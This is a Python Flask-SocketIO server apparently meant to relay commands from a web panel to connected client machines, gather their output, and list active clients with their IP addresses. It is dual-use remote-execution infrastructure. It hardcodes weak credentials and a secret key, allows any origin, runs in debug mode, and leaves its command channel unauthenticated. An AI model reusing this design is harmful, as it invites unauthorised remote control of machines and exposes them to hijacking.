from flask import Flask, render_template, request, make_response
from flask_socketio import SocketIO, send, emit, disconnect
from functools import wraps

# Basic Authentication


def auth_required(func):
    @wraps(func)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if auth and auth.username == 'commander' and auth.password == 'commander123':
            return func(*args, **kwargs)
        return make_response('Could not verify you, Commander !', 401, {
            'WWW-Authenticate': 'Basic realm="Login Required !'
        })

    return decorated


app = Flask(__name__, template_folder='templates/')
app.config['SECRET_KEY'] = 'secret'
socketio = SocketIO(app, cors_allowed_origins="*")


connected_users = {}
active_users = []


@app.route('/', methods=['GET', 'POST'])
@auth_required
def index():
    return "Monitor Server"


@socketio.on('first_handshake')
def handle_first_handshake(payload):

    connected_users[payload['client_ID']] = payload['client_Session_ID']
    socketio.emit('client_please_report', 'Dummy', broadcast=True)
    active_users.clear()

# Handling command from the frontend and sending to client for execution
@socketio.on('command_from_web', namespace='/command')
def command_to_client(payload):

    print(str(payload))
    recipient_session_ID = payload['client_ID']
    command = payload['command']
    emit('server_commands', command, room=recipient_session_ID)

# Command Execution from Client to Server
@socketio.on('output_from_client')
def handle_output_from_client(message):
    print(f'The execution in Client was : {message}')
    socketio.emit('output_from_client_to_web', message)

# Taking attendance of realtime clients and updating frontend.
@socketio.on('realtime_attendance')
def collect_realtime_attendance(payload):
    payload['client_IP'] = request.access_route
    active_users.append(payload)
    socketio.emit('update_connections_list', active_users)

# Populating the frontend when reloading.
@socketio.on('populate_me')
def populate_frontend(message):
    print(active_users)
    socketio.emit('update_connections_list', active_users)


debug = True

if __name__ == "__main__":
    # app.run(debug=debug)
    socketio.run(app, debug=debug, port=5000)
